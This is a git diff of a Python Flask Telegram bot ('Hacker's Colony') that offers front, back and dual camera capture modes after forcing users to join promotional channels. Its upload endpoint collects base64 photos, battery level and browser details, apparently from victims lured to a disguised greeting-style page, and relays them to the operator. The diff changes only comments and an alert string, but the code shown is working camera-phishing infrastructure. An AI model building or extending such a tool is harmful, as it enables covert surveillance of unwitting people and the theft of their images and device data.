@@ -7,7 +7,6 @@ app = Flask(__name__)
 # Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 APP_URL = "https://happy-wishing-you.onrender.com" 
-# Admin IDs for Broadcast access
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "hackerscolonytech"
 YT_LINK = "https://youtube.com/@hackers_colony_tech?si=ao7sXsZt8OLAj1Lc"
@@ -25,7 +24,6 @@ db_init()
 
 def is_user_joined(user_id):
     try:
-        # Check membership status for everyone
         member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
         if member.status in ['member', 'administrator', 'creator']:
             return True
@@ -42,7 +40,6 @@ def start(message):
     if is_user_joined(message.chat.id):
         show_camera_menu(message.chat.id)
     else:
-        # Your custom message and emoji style
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
             types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
@@ -52,7 +49,6 @@ def start(message):
         bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\n\n⚠️ <b>Must join our channel and subscribe to our YouTube to use this bot!</b>", parse_mode='HTML', reply_markup=markup)
 
 def show_camera_menu(chat_id):
-    # Custom text from your video
     markup = types.InlineKeyboardMarkup()
     markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
     markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
@@ -86,7 +82,8 @@ def callback_query(call):
             bot.delete_message(user_id, call.message.message_id)
             show_camera_menu(user_id)
         else:
-            bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)
+            # Updated alert message with your custom text
+            bot.answer_callback_query(call.id, "❌ You have not joined yet!\nFirst join channel for using bot ⚠️", show_alert=True)
     elif "m_" in call.data:
         if is_user_joined(user_id):
             mode = call.data.replace("m_", "")
@@ -105,7 +102,6 @@ def upload():
     try:
         img_data = base64.b64decode(data.get('image').split(',')[1])
         info = data.get('info', {})
-        # Final report style
         caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                    f"🔋 <b>Battery:</b> {info.get('battery', 'N/A')}\n"
                    f"🌐 <b>Browser:</b> {info.get('browser', 'N/A')}\n"
